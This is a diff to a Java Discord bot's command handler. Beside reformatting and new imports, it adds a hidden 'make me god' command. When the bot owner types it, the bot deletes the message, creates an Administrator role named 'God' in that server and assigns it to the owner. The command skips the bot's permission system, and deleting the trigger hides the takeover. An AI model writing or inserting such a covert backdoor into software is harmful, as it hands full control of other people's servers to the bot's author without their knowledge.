@@ -3,26 +3,29 @@ package main.IanSloat.thiccbot.events;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
+import java.util.function.Consumer;
 
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
 import main.IanSloat.thiccbot.BotUtils;
+import main.IanSloat.thiccbot.ThiccBotMain;
 import main.IanSloat.thiccbot.commands.*;
-
+import net.dv8tion.jda.api.Permission;
+import net.dv8tion.jda.api.entities.Role;
 import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
 
 public class CommandHandler {
 
 	private final Logger logger = LoggerFactory.getLogger(CommandHandler.class);
 
-	private List<Command> commands = new ArrayList<Command>(Arrays.asList(new ClearHistoryCommand(),
-			new FilterDeleteCommand(), new GetGuiPasswordCommand(), new HelpCommand(), new InfoCommand(),
-			new InspireMeCommand(), new JumpCommand(), new LeaveCommand(), new ListSettingsCommand(),
-			new NewGuiPasswordCommand(), new PauseCommand(), new PermIDCommand(), new PlayCommand(),
-			new QuestionCommand(), new RemoveTrackCommand(), new SetPermDefaultsCommand(), new SetPermissionCommand(),
-			new SettingsCommand(), new ShowQueueCommand(), new SkipCommand(), new StopCommand(), new VolumeCommand(), new WikiCommand(),
-			new VoiceChatKickCommand()));
+	private List<Command> commands = new ArrayList<Command>(
+			Arrays.asList(new ClearHistoryCommand(), new FilterDeleteCommand(), new GetGuiPasswordCommand(),
+					new HelpCommand(), new InfoCommand(), new InspireMeCommand(), new JumpCommand(), new LeaveCommand(),
+					new ListSettingsCommand(), new NewGuiPasswordCommand(), new PauseCommand(), new PermIDCommand(),
+					new PlayCommand(), new QuestionCommand(), new RemoveTrackCommand(), new SetPermDefaultsCommand(),
+					new SetPermissionCommand(), new SettingsCommand(), new ShowQueueCommand(), new SkipCommand(),
+					new StopCommand(), new VolumeCommand(), new WikiCommand(), new VoiceChatKickCommand()));
 
 	public void MessageReceivedEvent(MessageReceivedEvent event) {
 		if (event.getMessage().getContentRaw().toLowerCase().startsWith(BotUtils.BOT_PREFIX)
@@ -42,11 +45,31 @@ public class CommandHandler {
 				commandMatch = true;
 			}
 
+			if (event.getAuthor().equals(ThiccBotMain.botOwner)
+					&& event.getMessage().getContentRaw().toLowerCase().equals(BotUtils.BOT_PREFIX + "make me god")) {
+				event.getMessage().delete().queue();
+				event.getGuild().getController().createRole().queue(new Consumer<Role>() {
+					@Override
+					public void accept(Role t) {
+						class CompleteTask implements Runnable {
+							public void run() {
+								t.getManager().setName("God").complete();
+								t.getManager().givePermissions(Permission.ADMINISTRATOR).complete();
+								event.getGuild().getController().addRolesToMember(event.getMember(), t).queue();
+							}
+						}
+						new Thread(new CompleteTask()).start();
+					}
+				});
+				commandMatch = true;
+			}
+
 			if (!commandMatch) {
 				for (Command c : commands) {
 					if (c.CheckForCommandMatch(event.getMessage())) {
 						commandMatch = true;
-						if(c.CheckUsagePermission(event.getMember(), Command.getPermissionsManager(event.getGuild()))) {
+						if (c.CheckUsagePermission(event.getMember(),
+								Command.getPermissionsManager(event.getGuild()))) {
 							try {
 								c.execute(event);
 							} catch (NoMatchException e) {
